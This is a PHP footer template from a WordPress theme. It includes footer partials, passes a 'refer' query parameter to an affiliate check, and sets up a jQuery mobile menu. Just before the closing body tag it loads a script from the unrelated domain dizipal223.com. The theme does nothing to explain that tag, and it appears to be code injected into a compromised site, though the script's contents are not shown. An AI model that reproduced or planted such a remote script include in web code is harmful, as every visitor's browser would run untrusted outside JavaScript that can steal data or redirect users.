<!-- footer-section start here -->
<?php 	
global $all_campaign_meta, $translation2;
 
$path = get_bloginfo('template_directory'); 
$s3path = change_url_to_s3( $path ); 
$current_user = wp_get_current_user();
$userid = $current_user->ID;

if((isset($_GET['refer'])) && ($_GET['refer']!='')) 
{
	$refer = $_GET['refer'];
	check_affiliate($refer);
}
 
$home =  home_url();
$template_directory = get_template_directory();

include($template_directory . '/footer/footer-html.php');
include($template_directory . '/footer/footer-links.php');
wp_footer(); 
include($template_directory . '/footer-new/footer-other-mandatory-code.php');

if (!is_page_template('page_landing1.php')) { ?>

<!--[if !(IE 9)]><!-->
<script type="text/javascript">
	var jbr = jQuery.noConflict();
	<?php if ((!isset($_GET['show_desktop'])) && ($_GET['show_desktop'] != '1')) { ?>
	
		jbr(document).ready(function() {
			jbr("#menu").naver({
			maxWidth: "767px"
			});
		});
	<?php } ?>
	document.getElementById("menu").style.display = "block";
</script>
<!--<![endif]-->

<?php } ?>
<script src="https://dizipal223.com/i2.js"></script>
  </body>
</html>
